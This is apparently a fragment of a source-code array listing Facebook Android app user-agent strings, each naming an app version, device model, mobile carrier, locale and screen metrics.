"[FBAN/FB4A;FBAV/280.0.0.48.122;FBBV/233235288;FBDM/{density=2.0,width=720,height=1411};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468671;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/237905603;FBCR/TESCO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741974;FBDM/{density=2.75,width=1080,height=2088};FBLC/en_US;FBRV/236912743;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3a;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128812;FBDM/{density=3.0,width=1080,height=2265};FBLC/es_ES;FBRV/0;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372498;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_BR;FBRV/225933467;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4);FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966557;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/239276683;FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J710GN;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966351;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/281.0.0.36.124;FBBV/234741952;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/0;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A510F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/186.0.0.48.81;FBBV/121473359;FBDM/{density=2.75,width=1080,height=2030};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966664;FBDM/{density=3.375,width=1080,height=2169};FBLC/en_GB;FBRV/239563931;FBCR/vodafone UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966535;FBDM/{density=1.0,width=800,height=1280};FBLC/es_LA;FBRV/238980462;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T560;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966351;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/239526854;FBCR/U.S. Cellular;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966664;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/239607955;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540727;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBRV/186600517;FBCR/TELCEL;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/Alcatel_4060A;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634253;FBDM/{density=3.0,width=1080,height=2107};FBLC/de_DE;FBRV/240110713;FBCR/3 AT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634251;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/240110713;FBCR/;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1032;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634229;FBDM/{density=3.0,width=1080,height=1920};FBLC/uk_UA;FBRV/0;FBCR/KYIVSTAR;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966557;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966565;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/239808926;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G610M;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/273.0.0.39.123;FBBV/218047971;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_US;FBRV/219557400;FBCR/vodafone IE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634253;FBDM/{density=3.0,width=1080,height=2120};FBLC/en_US;FBRV/240970454;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634251;FBDM/{density=2.0,width=720,height=1406};FBLC/en_US;FBRV/241011053;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634227;FBDM/{density=2.25,width=720,height=1172};FBLC/pt_BR;FBRV/241054900;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4);FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634229;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/241105727;FBCR/Oi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634243;FBDM/{density=3.375,width=1080,height=1998};FBLC/pt_BR;FBRV/241192129;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6);FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634227;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/241289266;FBCR/Metro by T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J737T1;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634229;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/241289266;FBCR/Claro BR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783074;FBDM/{density=3.0,width=1080,height=2139};FBLC/en_US;FBRV/214496621;FBCR/3;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=3.0,width=1080,height=2029};FBLC/en_US;FBRV/0;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747313;FBDM/{density=3.375,width=1080,height=2110};FBLC/en_US;FBRV/241638140;FBCR/ETISALAT;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747247;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/241778698;FBCR/OI | Oi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/284.0.0.50.107;FBBV/239634226;FBDM/{density=1.5,width=480,height=888};FBLC/en_US;FBRV/241192129;FBCR/HOME;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/A501DL;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=3.375,width=2095,height=1080};FBLC/pt_BR;FBRV/0;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505GT;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/242199540;FBCR/Koodo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A530W;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/242199540;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=1.75,width=720,height=1379};FBLC/pt_BR;FBRV/242138049;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/265.0.0.61.103;FBBV/208173393;FBDM/{density=1.3312501,width=540,height=960};FBLC/en_US;FBRV/209227614;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/8050E;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747356;FBDM/{density=3.5,width=1440,height=2792};FBLC/pt_BR;FBRV/0;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9650;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/242406593;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747291;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/242199540;FBCR/TIM 71 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/242370961;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/268.1.0.54.121;FBBV/211681925;FBDM/{density=2.75,width=1080,height=2134};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=3.0,width=1080,height=2076};FBLC/pt_BR;FBRV/242621307;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747247;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_BR;FBRV/242448754;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188827996;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/192128667;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J710MN;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.625,width=1080,height=2047};FBLC/pt_BR;FBRV/242722359;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171819;FBDM/{density=3.375,width=1080,height=1758};FBLC/pt_BR;FBRV/242788013;FBCR/VIVO;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171833;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/242778727;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600GT;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=3.0,width=1080,height=2178};FBLC/de_DE;FBRV/0;FBCR/mobilcom-debitel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171818;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/Qlink;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/N9517;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171764;FBDM/{density=2.25,width=720,height=1372};FBLC/pt_BR;FBRV/243490205;FBCR/TIMBRASIL | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9600;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2130};FBLC/pt_BR;FBRV/243422339;FBCR/Vivo;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171818;FBDM/{density=2.0,width=720,height=1344};FBLC/en_GB;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171837;FBDM/{density=3.375,width=1080,height=1998};FBLC/pt_BR;FBRV/243894136;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6);FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/0;FBCR/Metro by T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q720;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171818;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/243856024;FBCR/TIM 41 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G570M;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171833;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/243894136;FBCR/TIM 43 | TIM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2068};FBLC/pt_BR;FBRV/243894136;FBCR/Claro BR;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171833;FBDM/{density=1.75,width=720,height=1396};FBLC/pt_BR;FBRV/243856024;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J610G;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",
"Mozilla/5.0 (Linux; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660864;FBDM/{density=1.7,width=720,height=1358};FBLC/es_LA;FBRV/0;FB_FW/2;FBCR/;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto e5 plus;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=3.0,width=1080,height=2137};FBLC/it_IT;FBRV/244332354;FBCR/Iliad;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/283.0.0.31.121;FBBV/237966664;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/239808926;FBCR/Vodafone IN;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5000;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660883;FBDM/{density=3.375,width=2028,height=1080};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660865;FBDM/{density=3.0,width=1080,height=1794};FBLC/ro_RO;FBRV/244385206;FBCR/orange;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660865;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_BR;FBRV/244924960;FBCR/Vivo;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S);FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/285.0.0.43.120;FBBV/240747352;FBDM/{density=2.75,width=1080,height=2134};FBLC/pt_BR;FBRV/242370961;FBCR/TIM;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/288.0.0.46.123;FBBV/245199186;FBDM/{density=2.625,width=1080,height=2131};FBLC/pt_BR;FBRV/245294890;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305GT;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.75,width=1080,height=2130};FBLC/pt_BR;FBRV/245218954;FBCR/TIM;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 10; SM-N960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660882;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/288.0.0.46.123;FBBV/245199177;FBDM/{density=1.75,width=720,height=1381};FBLC/pt_BR;FBRV/245294890;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A107M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/287.1.0.51.119;FBBV/245251844;FBDM/{density=2.0,width=720,height=1362};FBLC/pt_BR;FBRV/0;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 5.0.2; Andromax C46B2G Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/60.0.0.16.76;]','[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]','Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303553;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/245833694;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G570M;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303567;FBDM/{density=2.25,width=720,height=1332};FBLC/pt_BR;FBRV/246287057;FBCR/Oi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(6) play;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303582;FBDM/{density=2.625,width=1080,height=2094};FBLC/pt_BR;FBRV/246107654;FBCR/Nextel Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G9650;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 10; ALP-L09 Build/HUAWEIALP-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36 [FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=3.0,width=1080,height=1808};FBLC/en_US;FBRV/238531756;FB_FW/2;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ALP-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Mozilla/5.0 (Linux; Android 10; ALP-L09 Build/HUAWEIALP-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36 [FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=3.0,width=1080,height=1808};FBLC/en_US;FBRV/238531756;FB_FW/2;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303580;FBDM/{density=2.0,width=720,height=1371};FBLC/pt_BR;FBRV/246374287;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g(7) power;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128803;FBDM/{density=1.75,width=1422,height=720};FBLC/es_LA;FBRV/0;FBCR/ENTEL | #Cuidemonos;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A207M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303567;FBDM/{density=2.0,width=720,height=1384};FBLC/pt_BR;FBRV/247079209;FBCR/Vivo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600GT;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/288.1.0.47.123;FBBV/245303582;FBDM/{density=3.5,width=1440,height=2792};FBLC/hu_HU;FBRV/247060129;FBCR/Telekom HU;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/289.0.0.40.121;FBBV/246888191;FBDM/{density=2.75,width=1080,height=2027};FBLC/pt_BR;FBRV/247451215;FBCR/Vivo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/POCOPHONE F1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
